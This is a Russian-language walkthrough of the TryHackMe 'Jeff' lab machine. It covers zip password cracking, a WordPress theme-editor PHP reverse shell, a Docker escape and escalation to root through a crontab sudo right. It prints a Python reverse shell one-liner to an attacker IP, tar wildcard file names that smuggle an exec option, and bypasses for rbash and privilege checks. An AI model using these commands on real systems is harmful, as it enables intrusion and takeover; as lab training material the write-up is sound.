# Jeff

:white_check_mark:  [**Zip pass brute**](#Zip_pass_brute)

:white_check_mark:  [**Curl ftp server**](#Curl_ftp_server)

:white_check_mark:  [**Docker escape via ftp and tar wildcards**](#Docker_escape_via_ftp_and_tar_wildcards)

:white_check_mark:  [**Curl ftp server sending files**](#Curl_ftp_server_sending_files)

:white_check_mark:  [**Symbolic link for opening files**](#Symbolic_link_for_opening_files)

:white_check_mark:  [**Rbash(command restriction)**](#Rbash_command_restriction)

:white_check_mark:  [**Crontab(privesc)**](#Crontab_privesc)
___

## Enumeration
Сканируем ip командой:
```
nmap -sC -sV jeff.thm
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7e:43:5f:1e:58:a8:fc:c9:f7:fd:4b:40:0b:83:79:32 (RSA)
|   256 5c:79:92:dd:e9:d1:46:50:70:f0:34:62:26:f0:69:39 (ECDSA)
|_  256 ce:d9:82:2b:69:5f:82:d0:f5:5c:9b:3e:be:76:88:c3 (ED25519)
80/tcp open  http    nginx
|_http-title: Jeffs Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Главная страница **jeff.thm**:

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/1.png)

На главной странице все кнопки не активны.

Просканируем директории.
```
feroxbuster -u http://jeff.thm -x php,html,txt,js,c,asm,zip 
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/2.png)

Просканировав директории находим файл backup.zip.
```
http://jeff.thm/backups/backup.zip
```

<a name="Zip_pass_brute"></a>

Скачаем файл. Для того чтобы его распаковать требуется ввести пароль.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/3.png)

Попробуем пробрутить пароли. Для этого будем использоваться fcrackzip.
```
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/4.png)

Распаковываем архив. В архиве находим пароль от аккаунта wordpress.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/5.png)

Пробрутим поддомены с помощью gobuster.
```
gobuster vhost -u jeff.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -t 100
```

```
Found: wordpress.jeff.thm (Status: 200) [Size: 25901]
```

Главная страница wordpress.jeff.thm.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/6.png)

С помощью wpscan попробуем найти имена пользователей.
```
wpscan --url wordpress.jeff.thm --enumerate u
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/7.png)

Перейдем на страницу аутентифицакии.
```
http://wordpress.jeff.thm/wp-admin/
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/8.png)

Авторизуемся с имеющимися данными и входим в систему.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/9.png)

Будем использовать wordpress theme editor для получения обратной оболочки. Перейдем в Appearance -> Theme Editor. Выберем тему Twenty Seventeen, файл 404 Template. Закидываем php_reverse_shell изменив ip на свой и сохраняем изменения.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/10.png)

Запускаем слушатель и открываем файл в строке браузера.
```
http://wordpress.jeff.thm/wp-content/themes/twentyseventeen/404.php
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/11.png)

Отправим на машину linpeas. Закончив сканирование можно заметить, что мы находимся в докере.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/12.png)

Также можно заметить файл ftp_backup.php

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/13.png)

<a name="Curl_ftp_server"></a>

Прочтем файл. В нем содержатся данные пользователя, которые мы можем использовать для подключения по ftp.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/14.png)

В докере не установлен ftp, поэтому будем использовать curl, чтобы просмотреть, что находится на сервере ftp.
```
curl -s -v -P - 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/'
```

<a name="Docker_escape_via_ftp_and_tar_wildcards"></a>

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/15.png)

Чтобы получить shell с основной машины будем использовать уязвимость wildcards.
```
echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<YOUR_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" > shell.sh

echo "" > "/tmp/--checkpoint=1"

echo "" > "/tmp/--checkpoint-action=exec=sh shell.sh"
```

<a name="Curl_ftp_server_sending_files"></a>

Загрузим эти файлы на сервер ftp.
```
curl -v -P - -T "/tmp/shell.sh" 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'

curl -v -P - -T "/tmp/--checkpoint=1" 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'

curl -v -P - -T "/tmp/--checkpoint-action=exec=sh shell.sh" 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'
```

Запускаем слушатель и через некоторое время получаем обратную оболочку.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/16.png)

Закнем linpeas на машину и заупстим скрипт. Можно обнаружить странный файл.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/17.png)

Перейдем в эту директорию. В ней мы можем обнаружить сообщение. 

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/18.png)

Файл systool при попытке получения пароля пользователя jeff открывает файл message.txt. Также файл systool запускается из группы pwman. Попробуем найти файлы с группой pwman.
```
find / -group pwman 2>/dev/null
```

<a name="Symbolic_link_for_opening_files"></a>

Находим файл jeff.bak, но прочитать мы его не можем.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/19.png)

Создадим символическую ссылку на файл. Чтобы вместо message.txt открыть jeff.bak.
```
rm /opt/systools/message.txt

ln -s /var/backups/jeff.bak /opt/systools/message.txt

/opt/systools/systool
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/20.png)

<a name="Rbash_command_restriction"></a>

Получаем пароль от пользователя jeff. Зайдем по ssh.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/21.png)

Попробовав прочитать файл, мы получаем ошибку. Выполнение команд ограничено.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/22.png)

Для обхода ограничения будем использовать следующую команду.
```
ssh jeff@jeff.thm -t "bash -l"
```
```
ssh -l: Принудительное выделение псевдотерминала. Может быть использовано для выполнения произвольных экранных программ на удаленной машине.

bash -l: заставляет bash действовать так, как если бы он был вызван как оболочка входа в систему.
```

Снова подключившись по ssh, мы не можем использовать команды, так как PATH не содержит нужные директории. Добавим их сами.
```
export PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin
```

Теперь мы можем прочесть флаг.

<a name="Crontab_privesc"></a>

Проверим права командой sudo -l.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Jeff/23.png)

Мы имеем права к crontab. С помощью crontab откроем bash.
```
sudo crontab -e
```

Прописываем :!/bin/bash и нажимаем Enter. Мы получили рута.
